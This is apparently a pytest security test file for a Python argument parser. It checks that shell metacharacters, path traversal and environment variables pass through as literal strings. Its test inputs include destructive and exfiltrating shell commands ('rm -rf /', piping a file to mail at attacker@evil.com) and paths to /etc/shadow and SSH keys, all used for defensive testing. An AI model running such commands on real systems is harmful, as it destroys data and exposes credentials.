import pytest

from aclaf.parser import EXACTLY_ONE_ARITY, CommandSpec, OptionSpec, Parser


@pytest.mark.security
class TestShellMetacharacterHandling:
    def test_semicolon_preserved_as_literal(self):
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "rm file.txt; rm -rf /"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        # Verify semicolon is preserved literally
        assert ";" in result.options["command"].value

    def test_ampersand_preserved_as_literal(self):
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "sleep 10 & echo 'hacked'"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "&" in result.options["command"].value

    def test_pipe_preserved_as_literal(self):
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "cat file.txt | mail attacker@evil.com"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "|" in result.options["command"].value

    def test_backtick_preserved_as_literal(self):
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "`whoami`"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "`" in result.options["command"].value

    def test_dollar_paren_preserved_as_literal(self):
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "$(ls -la)"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "$(" in result.options["command"].value
        assert ")" in result.options["command"].value

    def test_multiple_metacharacters_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "rm -rf /; echo 'done' | mail user@host & $(whoami)"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        # Verify all dangerous characters are preserved
        assert ";" in result.options["command"].value
        assert "|" in result.options["command"].value
        assert "&" in result.options["command"].value
        assert "$(" in result.options["command"].value


@pytest.mark.security
class TestPathTraversalPreservation:
    def test_unix_path_traversal_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        traversal_path = "../../../etc/passwd"
        result = parser.parse(["--file", traversal_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == traversal_path
        # Verify path traversal pattern is preserved for validation
        assert "../" in result.options["file"].value

    def test_windows_path_traversal_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        traversal_path = "..\\..\\..\\windows\\system32\\config\\sam"
        result = parser.parse(["--file", traversal_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == traversal_path
        # Verify path traversal pattern is preserved for validation
        assert "..\\" in result.options["file"].value

    def test_redundant_path_traversal_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        traversal_path = "/etc/../etc/passwd"
        result = parser.parse(["--file", traversal_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == traversal_path
        assert "/../" in result.options["file"].value

    def test_absolute_path_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        sensitive_path = "/etc/shadow"
        result = parser.parse(["--file", sensitive_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == sensitive_path
        # Absolute path is preserved for validation
        assert result.options["file"].value.startswith("/")


@pytest.mark.security
class TestEnvironmentVariableHandling:
    def test_environment_variable_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"output": OptionSpec("output", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        env_var_input = "$HOME/.ssh/authorized_keys"
        result = parser.parse(["--output", env_var_input])

        assert isinstance(result.options["output"].value, str)
        assert result.options["output"].value == env_var_input
        # Verify $HOME is NOT expanded
        assert "$HOME" in result.options["output"].value

    def test_brace_env_variable_preserved(self):
        spec = CommandSpec(
            name="cmd",
            options={"config": OptionSpec("config", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        env_var_input = "${XDG_CONFIG_HOME}/malicious.conf"
        result = parser.parse(["--config", env_var_input])

        assert isinstance(result.options["config"].value, str)
        assert result.options["config"].value == env_var_input
        # Verify ${VAR} is preserved literally
        assert "${XDG_CONFIG_HOME}" in result.options["config"].value
